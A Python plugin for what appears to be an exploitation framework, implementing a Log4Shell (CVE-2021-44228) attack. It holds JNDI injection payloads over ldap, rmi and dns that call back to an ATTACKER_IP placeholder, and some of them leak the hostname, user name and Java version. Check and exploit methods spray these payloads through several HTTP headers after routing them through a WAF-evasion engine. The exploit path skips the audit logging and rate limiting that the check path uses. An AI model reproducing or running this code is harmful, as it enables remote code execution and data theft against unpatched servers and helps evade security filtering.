"""
Plugin for CVE-2021-44228: Log4Shell.
"""

from __future__ import annotations

import random
from typing import TYPE_CHECKING, Any

from spring2shell.evasion.waf_engine import waf_engine
from spring2shell.plugins.base import BasePlugin
from spring2shell.utils.auth import audit_log, rate_limit_acquire

if TYPE_CHECKING:
    import requests


class CVE_2021_44228_Plugin(BasePlugin):
    """Log4Shell JNDI injection (CVE-2021-44228) Plugin."""

    name = "cve_2021_44228"
    cve_id = "CVE-2021-44228"
    description = "Log4Shell — JNDI injection (Log4j 2.0-beta9 to 2.14.1)"

    payload_templates = [
        "${jndi:ldap://ATTACKER_IP:1389/COMMAND}",
        "${jndi:rmi://ATTACKER_IP:1099/COMMAND}",
        "${jndi:dns://ATTACKER_IP/COMMAND}",
        "${jndi:ldap://${hostName}.ATTACKER_IP:1389/COMMAND}",
        "${jndi:ldap://${env:USER}.ATTACKER_IP:1389/COMMAND}",
        "${jndi:ldap://${sys:java.version}.ATTACKER_IP:1389/COMMAND}",
    ]

    def check(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
    ) -> dict[str, Any] | None:
        # Since Log4Shell is blind/OOB, standard inline confirmation is tricky
        # unless OOB callback is used. Let's send the payloads to trigger.
        # We replace ATTACKER_IP with a mock/OOB server or dummy.
        dummy_ip = "127.0.0.1"
        marker = f"RCE_{random.randint(100000, 999999)}"

        for payload_template in self.payload_templates:
            payload = payload_template.replace("ATTACKER_IP", dummy_ip).replace("COMMAND", marker)
            req_headers = headers.copy()
            # Try different headers where Log4j might log
            for header_name in ("User-Agent", "Referer", "X-Api-Version", "Authorization"):
                req_headers[header_name] = payload
                payload_val, final_headers = waf_engine.apply(payload, req_headers)

                try:
                    rate_limit_acquire()
                    resp = session.post(
                        endpoint, data=payload_val, headers=final_headers, timeout=5
                    )
                    audit_log("POST", endpoint, resp.status_code, payload_val[:100], "cve_scan")
                except Exception:
                    continue
        return None

    def exploit(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
        command: str,
    ) -> str | None:
        # For actual exploitation, the user should provide the OOB server.
        # We replace ATTACKER_IP with command/server.
        for payload_template in self.payload_templates:
            payload = payload_template.replace("ATTACKER_IP", command).replace("COMMAND", "exploit")
            req_headers = headers.copy()
            for header_name in ("User-Agent", "Referer", "X-Api-Version", "Authorization"):
                req_headers[header_name] = payload
                payload_val, final_headers = waf_engine.apply(payload, req_headers)
                try:
                    session.post(endpoint, data=payload_val, headers=final_headers, timeout=5)
                except Exception:
                    continue
        return "Exploit payload sent (OOB verification required)."
